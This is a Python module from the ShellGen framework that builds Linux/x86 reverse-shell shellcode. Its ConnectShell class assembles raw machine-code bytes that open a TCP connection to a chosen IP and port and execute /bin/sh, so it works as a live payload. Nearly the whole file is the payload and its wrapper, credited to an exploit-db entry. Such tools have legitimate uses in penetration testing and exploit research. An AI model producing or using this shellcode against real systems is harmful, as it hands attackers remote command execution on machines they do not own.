#!/usr/bin/env python

###############################################################################
## Connect to an arbitrary IP and TCP port execute /bin/sh in Linux/x86      ##
## Shellcode for ShellGen                                                    ##
## Based on original code by Maximiliano Gomez Vidal                         ##
## http://www.exploit-db.com/exploits/36397/                                 ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, Maximiliano Gomez Vidal
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Connect to an arbitrary IP and TCP port and execute /bin/sh."

__all__ = ["ConnectShell"]

from shellgen import Dynamic

from socket import inet_aton
from struct import pack

class ConnectShell (Dynamic):
    """
    "Connect to an arbitrary IP and TCP port execute /bin/sh in Linux/x86.

    Based on original code by Maximiliano Gomez Vidal:
    U{http://www.exploit-db.com/exploits/36397/}

    @ivar address: IP address to connect to.
    @type address: str
    @ivar port: TCP port to connect to.
    @type port: int
    """

    qualities = "payload"
    encoding  = "nullfree"

    def __init__(self, address = "192.168.133.1", port = 33333):
        """
        @param address: IP address to connect to.
        @type address: str
        @param port: TCP port to connect to.
        @type port: int
        """
        self.address = address
        self.port    = port

    @property
    def address(self):
        return self.__address

    @address.setter
    def address(self, address):
        inet_aton(address)
        self.__address = address

    @property
    def port(self):
        return self.__port

    @port.setter
    def port(self, port):
        port = int(port)
        if port > 65535 or port < 0:
            raise ValueError("Invalid TCP port: %d" % port)
        self.__port = port

    def compile(self, state = None):
        bytes = (
            "\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
            "\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
        ) + inet_aton(self.address) + (
            "\x66\x68"
        ) + pack("!H", self.port) + (
            "\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
            "\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
        )
        if "\x00" in bytes:
            self.remove_encoding("nullfree")
        else:
            self.add_encoding("nullfree")
        return bytes
